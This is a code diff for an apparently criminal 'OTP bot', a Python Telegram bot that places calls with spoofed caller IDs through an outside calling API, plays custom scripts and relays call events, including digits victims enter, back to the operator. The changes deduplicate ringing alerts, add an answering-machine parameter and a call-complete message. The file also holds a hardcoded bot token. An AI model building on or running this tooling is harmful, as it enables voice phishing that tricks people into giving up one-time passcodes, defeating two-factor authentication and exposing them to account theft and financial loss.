@@ -33,9 +33,9 @@ d_data='otbbotdatabase'
 
 ngrok_url= "https://sourceotp.online:8443"  # NGROK APP LINK HERE
 bot_tkn ='7229632476:AAFZHpaFIZzOJrskzphIfMoTsDyjSlZWwoc'  # YOUR BOT API bot_tkn HERE
-apiKey = 'bveigheuge8gberubr'
+apiKey = '123456789101112'
 last_message_ids = {}
-
+ringing_handler = []
 updater = Updater(token=bot_tkn, use_context=True)
 dispatcher = updater.dispatcher
 
@@ -785,8 +785,6 @@ def callhangup(call_control:str):
     requests.post(urlh, json=data)
    
 
-
-
 def callhangbutton(userid):
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     item1 = types.InlineKeyboardButton(text="End Call", callback_data="/endcall") 
@@ -815,11 +813,11 @@ def callmaking(number,spoof,chatid,service):
 def make_call(t:str,f:str,user_id,service):
     callmaking(number=t,spoof=f,chatid=user_id,service=service)
 
-def custom_callmaking(number,spoof,chatid,script_id):
+def custom_callmaking(number,spoof,chatid,script_id,amd):
         url = "https://atlanta-api.online:8443/create-call"
         data = {
-             "to_": f"+{number}",
-              "from_": f"+{spoof}",
+             "to_": f"{number}",
+              "from_": f"{spoof}",
               "callbackURL": f"{ngrok_url}/{script_id}/{chatid}/custom",
               "api_key": f"{apiKey}",
                }
@@ -924,6 +922,7 @@ def custom_confirm1(message):
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
+    global ringing_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -937,7 +936,10 @@ def custom_prebuild_script_call(script_id,chatid):
     call_cost = voices[11]
     
     if event == "call.ringing":
-        callhangbutton(chatid)
+        
+        if call_control_id not in ringing_handler:  
+            callhangbutton(chatid)
+            ringing_handler.append(call_control_id)
         
     elif event == "call.answered":
             url1 = "https://atlanta-api.online:8443/gather-audio"
@@ -947,6 +949,10 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+            try:
+                ringing_handler.remove(call_control_id)
+            except:
+                 pass
         
 
     elif event == "call.hangup":
@@ -987,6 +993,9 @@ def custom_prebuild_script_call(script_id,chatid):
 
     # elif event == "amd.human":
     #     bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
+
+    elif event == "call.complete":
+         bot.send_message(chatid,f"""*Call Competed*""",parse_mode='markdown')
 
 
     elif event == "dtmf.entered":
